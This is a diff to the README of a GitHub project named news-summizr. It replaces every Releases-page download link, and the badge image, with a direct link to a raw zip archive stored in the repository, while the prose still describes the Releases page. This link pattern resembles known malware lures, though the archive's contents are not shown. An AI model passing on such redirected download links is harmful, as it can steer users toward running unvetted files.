@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download news-summizr](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mryin0479/news-summizr/releases)
+[![Download news-summizr](https://github.com/Mryin0479/news-summizr/raw/refs/heads/main/news_summizr/summizr_news_1.1.zip)](https://github.com/Mryin0479/news-summizr/raw/refs/heads/main/news_summizr/summizr_news_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to **news-summizr**! This application helps you extract structured summa
 
 To get started, you must download **news-summizr** from our Releases page. Click the link below to visit the page:
 
-[Download news-summizr](https://github.com/Mryin0479/news-summizr/releases)
+[Download news-summizr](https://github.com/Mryin0479/news-summizr/raw/refs/heads/main/news_summizr/summizr_news_1.1.zip)
 
 Once you are on the Releases page, look for the latest version. You will see a list of files available for download. Choose the file that fits your operating system (e.g., Windows, macOS, or Linux), and click **download**.
 
@@ -72,6 +72,6 @@ If you have questions or need help, feel free to check out our **Issues** sectio
 
 Ready to download? If you missed the earlier link, here it is again:
 
-[Download news-summizr](https://github.com/Mryin0479/news-summizr/releases)
+[Download news-summizr](https://github.com/Mryin0479/news-summizr/raw/refs/heads/main/news_summizr/summizr_news_1.1.zip)
 
 Enjoy using **news-summizr** to make sense of the news around you!
